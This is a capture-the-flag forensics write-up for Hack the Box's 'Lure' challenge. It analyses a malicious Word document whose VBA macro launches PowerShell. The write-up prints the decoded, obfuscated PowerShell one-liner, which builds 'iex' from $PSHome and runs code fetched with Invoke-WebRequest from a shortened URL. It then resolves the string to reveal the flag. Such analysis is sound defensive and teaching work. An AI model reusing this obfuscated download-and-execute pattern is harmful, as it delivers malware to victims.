Lure is an easy forensics challenge created by [**egre55**](https://app.hackthebox.com/users/1190) on [**Hack the Box**](https://app.hackthebox.com/challenges/lure) that involves the analysis of a malicious document that uses Microsoft Office VBA macros to execute code.

> The finance team received an important looking email containing an attached Word document. Can you take a look and confirm if it's malicious?

We'll first use the `olevba` utility from [oletools](https://github.com/decalage2/oletools) to get information from the document and potentially extract malicious Visual Basic macros.

```bash
# bryan@blue_team
olevba UrgentPayment.doc
```
{:.nolineno}

It looks like the document does in fact use macros to execute code. One call to _Shell_ seems particularly malicious:

This command issues a base64-encoded powershell script to execute. Let's decode that content and see what it holds.

```bash

```powershell
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))
```
{:file="decoded.ps1" .nolineno}

Although this script is obfuscated, we can tell by the structure and presence of **Invoke-WebRequest** (used under the alias _iwr_) that this will likely download and execute a file. The URL is not readable in its current form but we can easily just resolve the format string in a powershell session of our own.

```powershell
# bryan@blue_team
("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")
```

The output contains the url-encoded flag as part of the URL.
